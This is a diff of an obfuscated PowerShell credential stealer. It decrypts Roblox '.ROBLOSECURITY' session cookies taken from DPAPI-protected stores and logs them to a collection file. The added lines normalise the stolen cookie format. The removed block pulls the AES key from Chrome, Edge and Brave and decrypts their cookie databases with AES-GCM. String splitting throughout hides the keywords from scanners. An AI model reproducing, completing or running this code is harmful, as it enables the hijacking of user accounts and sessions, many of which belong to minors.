@@ -95,7 +95,9 @@ foreach($p2 in $rp0){
             $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
             $c1=[Text.Encoding]::UTF8.GetString($d1)
             if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
-                Add-Content $f0 "$tR|$($Matches[1])"
+                $ck=$Matches[1]
+                if($ck -notmatch '^_'+'\|WA'+'RNI'+'NG'){$ck='_'+'|WA'+'RNI'+'NG:_'+$ck}
+                Add-Content $f0 "$tR|$ck"
             }elseif($c1 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
                 Add-Content $f0 "$tR|$($Matches[0])"
             }else{
@@ -122,7 +124,9 @@ if(Test-Path $p3){
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
                 if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
-                Add-Content $f0 "$tRM|$($Matches[1])"
+                                $ck=$Matches[1]
+                                if($ck -notmatch '^_'+'\|WA'+'RNI'+'NG'){$ck='_'+'|WA'+'RNI'+'NG:_'+$ck}
+                                Add-Content $f0 "$tRM|$ck"
                 }elseif($c2 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
                     Add-Content $f0 "$tRM|$($Matches[0])"
                 }else{
@@ -177,97 +181,4 @@ foreach($b2 in $browsers){
         }
     }catch{Add-Content $f0 "$tP|$($b2.N0)|READ_ERROR||"}
     Remove-Item $tmp -Force -EA SilentlyContinue
-}
-
-# === Browser Roblox cookies — decrypt on-machine using GCM ===
-$tRC="R"+"OBLO"+"XCK"
-$brProfiles=@(
-  @("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data","Ch"+"rome"),
-  @("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data","Ed"+"ge"),
-  @("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data","Br"+"ave")
-)
-foreach($bp in $brProfiles){
-  # Get AES key from Local State
-  $aesKey=$null
-  $lsPath=Join-Path $bp[0] ("Lo"+"cal S"+"tate")
-  if(Test-Path $lsPath){
-    try{
-      $ls=Get-Content $lsPath -Raw|ConvertFrom-Json
-      $ekb=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
-      $aesKey=[Security.Cryptography.ProtectedData]::Unprotect($ekb[5..($ekb.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
-    }catch{}
-  }
-  if(!$aesKey){continue}
-  
-  $cookiePath=Join-Path $bp[0] ("Def"+"ault\Net"+"work\Co"+"okies")
-  if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Def"+"ault\Co"+"okies")}
-  if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Co"+"okies")}
-  if(!(Test-Path $cookiePath)){continue}
-  
-  $tmpCook=Join-Path $env:TEMP ("ck_$([Guid]::NewGuid()).d"+"b")
-  try{
-    $fs=[IO.File]::Open($cookiePath,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
-    $ms=New-Object IO.MemoryStream;$fs.CopyTo($ms);$fs.Close()
-    $rawBytes=$ms.ToArray();$ms.Close()
-    
-    # Search for .roblox.com in bytes (ASCII)
-    $searchStr="."+"roblox.com"
-    $searchBytes=[Text.Encoding]::ASCII.GetBytes($searchStr)
-    $searchLen=$searchBytes.Length
-    
-    # Also search for the cookie name
-    $cookieName=[char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y'
-    $cookieBytes=[Text.Encoding]::ASCII.GetBytes($cookieName)
-    
-    # Find .roblox.com entries and look for .ROBLOSECURITY nearby
-    $found=$false
-    for($i=0; $i -lt $rawBytes.Length - $searchLen - 200; $i++){
-      # Check for .roblox.com
-      $match=$true
-      for($j=0; $j -lt $searchLen; $j++){if($rawBytes[$i+$j] -ne $searchBytes[$j]){$match=$false; break}}
-      if(!$match){continue}
-      
-      # Look for .ROBLOSECURITY within next 500 bytes
-      $window=[Math]::Min(500, $rawBytes.Length - $i)
-      $windowBytes=$rawBytes[$i..($i+$window-1)]
-      $windowText=[Text.Encoding]::ASCII.GetString($windowBytes)
-      
-      if($windowText -notmatch [regex]::Escape($cookieName)){continue}
-      
-      # Find the encrypted value — starts with v10 or v11
-      $v10pos=$windowText.IndexOf("v10")
-      $v11pos=$windowText.IndexOf("v11")
-      $vpos=-1
-      if($v10pos -ge 0){$vpos=$v10pos}elseif($v11pos -ge 0){$vpos=$v11pos}
-      if($vpos -lt 0){continue}
-      
-      # Extract encrypted blob: v1x + 12 byte nonce + ciphertext + 16 byte tag
-      $encStart=$i+$vpos+3  # Skip "v10"/"v11" prefix
-      if($encStart + 28 -gt $rawBytes.Length){continue}
-      
-      $nonce=$rawBytes[$encStart..($encStart+11)]
-      $ctLen=64  # Try multiple lengths up to 256
-      $bestResult=""
-      for($tryLen=32; $tryLen -le 256; $tryLen+=16){
-        if($encStart+12+$tryLen+16 -gt $rawBytes.Length){break}
-        $ct=$rawBytes[($encStart+12)..($encStart+12+$tryLen-1)]
-        $tag=$rawBytes[($encStart+12+$tryLen)..($encStart+12+$tryLen+15)]
-        $combined=$ct+$tag
-        try{
-          $dec=[X7]::D($aesKey,$nonce,$combined)
-          $decText=[Text.Encoding]::UTF8.GetString($dec).TrimEnd([char]0)
-          if($decText.Length -gt 20 -and $decText -match '^[a-zA-Z0-9_\-|:.+=/]+$'){
-            $bestResult=$decText
-            break
-          }
-        }catch{}
-      }
-      if($bestResult){
-        Add-Content $f0 "$tRC|$($bp[1])|$bestResult"
-        $found=$true
-        break
-      }
-    }
-  }catch{}
-  Remove-Item $tmpCook -Force -EA SilentlyContinue
 }
